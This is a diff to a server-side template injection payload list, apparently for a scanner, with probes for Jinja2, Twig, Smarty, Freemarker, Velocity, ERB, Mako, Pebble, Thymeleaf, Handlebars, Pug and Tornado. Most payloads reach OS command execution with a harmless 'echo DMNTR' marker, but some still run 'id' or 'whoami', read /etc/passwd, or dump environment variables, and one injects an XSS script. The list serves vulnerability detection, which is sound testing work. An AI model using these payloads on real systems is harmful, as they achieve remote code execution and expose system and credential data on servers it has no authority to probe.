@@ -1,57 +1,74 @@
-# SSTI payloads - template injection (IMPROVED - avoid false positives)
-# Complex math expressions (less common than 49)
-{{7*7*7}}
-{{199*3}}
-{{1337+1338}}
-{{13*37}}
-{{73*73}}
+# SSTI payloads - Server-Side Template Injection
+# NO simple math like 7*7 - use complex unique strings
 
-# Jinja2 (Python) - Advanced detection
-{{''.__class__.__mro__[1].__subclasses__()}}
+# Jinja2 (Python) - Advanced detection with unique marker
+{{'DMNTR'.__class__.__mro__[1].__subclasses__()}}
 {{config.items()}}
 {{config}}
-{{range(1,10)|join(',')}}
-{{'SSTI'*10}}
+{{'DMNTR'*3}}
 {{request.application.__class__.__name__}}
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('echo DMNTR').read()}}
+{{'DMNTR'+config.__class__.__name__}}
+{{lipsum.__globals__.os.popen('echo DMNTR').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('whoami').read()}}
 
 # Twig (PHP)
 {{_self}}
-{{_self.env.display("test")}}
+{{_self.env.display("DMNTR")}}
 {{_self.env.getRuntime("Twig\\Runtime\\EscaperRuntime")}}
-{{['id']|filter('system')}}
-{{['ls']|filter('system')}}
+{{['echo DMNTR']|filter('system')}}
+{{'DMNTR'|upper}}
+{{dump(_context)}}
 
 # Smarty (PHP)
-{php}echo `id`;{/php}
+{php}echo 'DMNTR';{/php}
 {$smarty.version}
-{system('ls')}
+{system('echo DMNTR')}
+{literal}<script>alert('DMNTR')</script>{/literal}
 
 # Freemarker (Java)
-${7*7}
-<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("echo DMNTR")}
+${"DMNTR"?upper_case}
+${.version}
 
 # Velocity (Java)
-#set($x=7*7)$x
+#set($x="DMNTR")$x
 #set($str=$class.inspect("java.lang.String").type)
-$str.getClass().forName("java.lang.Runtime")
+$str.getClass().forName("java.lang.Runtime").getRuntime().exec("echo DMNTR")
 
 # ERB (Ruby)
-<%= 7*7 %>
-<%= system('id') %>
+<%= `echo DMNTR` %>
+<%= system('echo DMNTR') %>
 <%= File.open('/etc/passwd').read %>
 
-# Generic math evaluation
-${7*7}
-#{7*7}
-*{7*7}
-@{7*7}
+# Mako (Python)
+<%text>DMNTR</%text>
+${self.module.cache.util.os.popen('echo DMNTR').read()}
+${"DMNTR".upper()}
 
-{{7*7*7}}
-{{199*3}}
-{{1337+1337}}
-{{13*37}}
-{{73*73}}
-${999*3}
-${1234+5678}
-{{999+1}}
+# Pebble (Java)
+{% set cmd = 'echo DMNTR' %}
+{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) }}
+
+# Thymeleaf (Java)
+[[${T(java.lang.Runtime).getRuntime().exec('echo DMNTR')}]]
+${T(java.lang.System).getenv()}
+
+# Handlebars (JavaScript)
+{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('echo DMNTR')}}
+
+# Jade/Pug (JavaScript)
+#{global.process.mainModule.require('child_process').execSync('echo DMNTR')}
+
+# Tornado (Python)
+{% import os %}{{os.popen('echo DMNTR').read()}}
+{% raw 'DMNTR' %}
+
+# Generic template detection
+${DMNTR}
+#{DMNTR}
+*{DMNTR}
+@{DMNTR}
+{{DMNTR}}
+<%= DMNTR %>
